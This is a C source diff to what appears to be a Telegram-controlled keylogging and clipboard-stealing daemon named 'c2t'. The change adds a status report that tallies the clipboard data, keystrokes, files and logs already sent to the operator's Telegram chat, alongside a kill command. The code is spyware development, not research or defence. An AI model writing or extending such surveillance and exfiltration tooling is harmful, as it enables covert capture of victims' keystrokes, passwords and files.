@@ -88,6 +88,20 @@ static const char *get_command_argument(const char *text)
     return text;
 }
 
+static void format_metric_bytes(uint64_t b, char *out, size_t cap)
+{
+    if (!out || cap == 0) return;
+    if (b < 1024) {
+        snprintf(out, cap, "%llu B", (unsigned long long)b);
+    } else if (b < 1024 * 1024) {
+        snprintf(out, cap, "%.1f KB (%llu B)", (double)b / 1024.0, (unsigned long long)b);
+    } else if (b < 1024ULL * 1024 * 1024) {
+        snprintf(out, cap, "%.2f MB (%llu bytes)", (double)b / (1024.0 * 1024.0), (unsigned long long)b);
+    } else {
+        snprintf(out, cap, "%.2f GB (%llu bytes)", (double)b / (1024.0 * 1024.0 * 1024.0), (unsigned long long)b);
+    }
+}
+
 static void handle_command(const char *text, const char *chat_id, [[maybe_unused]] const char *username)
 {
     const c2t_config_t *config = c2t_config_get();
@@ -480,7 +494,25 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
             (clip_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Monitoring)");
         const char *kb_status = config->disable_keyboard ? "❌ <b>DISABLED</b> (--no-keyboard)" :
             (key_paused ? "⏸️ <b>PAUSED</b> (Muted)" : "🟢 <b>ACTIVE</b> (Capturing)");
-        char status_msg[1280];
+
+        uint64_t clip_bytes = clipboard_get_total_bytes();
+        uint64_t clip_events = clipboard_get_total_events();
+        uint64_t kb_bytes = keyboard_get_total_bytes();
+        uint64_t kb_keys = keyboard_get_total_keystrokes();
+        uint64_t file_bytes = c2t_files_get_total_bytes();
+        uint64_t file_count = c2t_files_get_total_files();
+        uint64_t log_bytes = c2t_log_sender_get_total_bytes();
+        uint64_t log_count = c2t_log_sender_get_total_dispatches();
+        uint64_t total_transferred = clip_bytes + kb_bytes + file_bytes + log_bytes;
+
+        char clip_b_str[64] = {}, kb_b_str[64] = {}, file_b_str[64] = {}, log_b_str[64] = {}, tot_b_str[64] = {};
+        format_metric_bytes(clip_bytes, clip_b_str, sizeof(clip_b_str));
+        format_metric_bytes(kb_bytes, kb_b_str, sizeof(kb_b_str));
+        format_metric_bytes(file_bytes, file_b_str, sizeof(file_b_str));
+        format_metric_bytes(log_bytes, log_b_str, sizeof(log_b_str));
+        format_metric_bytes(total_transferred, tot_b_str, sizeof(tot_b_str));
+
+        char status_msg[1600];
         snprintf(status_msg, sizeof(status_msg),
                  "🤖 <b>c2t Daemon Status</b>\n\n"
                  "• <b>Status:</b> 🟢 Active &amp; Running\n"
@@ -489,8 +521,14 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                  "• <b>Keyboard Target:</b> <code>%s</code> (Mode: %s)\n"
                  "• <b>Periodic Logs:</b> %s (Interval: %llu s)\n"
                  "• <b>File Uploads:</b> %s\n"
-                 "• <b>Window Info:</b> %s\n"
-                 "• <b>Delivery Queue:</b> %llu items / %llu bytes",
+                 "• <b>Window Info:</b> %s\n\n"
+                 "📊 <b>Data Transferred / Throughput:</b>\n"
+                 "• <b>Total Data Sent:</b> %s\n"
+                 "• 📋 <b>Clipboard:</b> %s (%llu events)\n"
+                 "• ⌨️ <b>Keyboard:</b> %s (%llu keystrokes)\n"
+                 "• 📁 <b>Files:</b> %s (%llu files sent)\n"
+                 "• 📜 <b>Logs:</b> %s (%llu flushes)\n\n"
+                 "📦 <b>Queue Limits:</b> %llu items / %llu MB",
                  clip_status,
                  kb_status,
                  kb_target,
@@ -499,8 +537,13 @@ static void handle_command(const char *text, const char *chat_id, [[maybe_unused
                  (unsigned long long)config->telegram_log_interval_sec,
                  config->telegram_send_files ? "Enabled" : "Disabled",
                  config->telegram_send_window_info ? "Enabled" : "Disabled",
+                 tot_b_str,
+                 clip_b_str, (unsigned long long)clip_events,
+                 kb_b_str, (unsigned long long)kb_keys,
+                 file_b_str, (unsigned long long)file_count,
+                 log_b_str, (unsigned long long)log_count,
                  (unsigned long long)config->queue_max_items,
-                 (unsigned long long)config->queue_max_bytes);
+                 (unsigned long long)(config->queue_max_bytes / (1024 * 1024)));
         telegram_send_html(status_msg);
     } else if (match_command(text, "kill") || match_command(text, "stop") ||
                match_command(text, "shutdown") || match_command(text, "terminate") ||
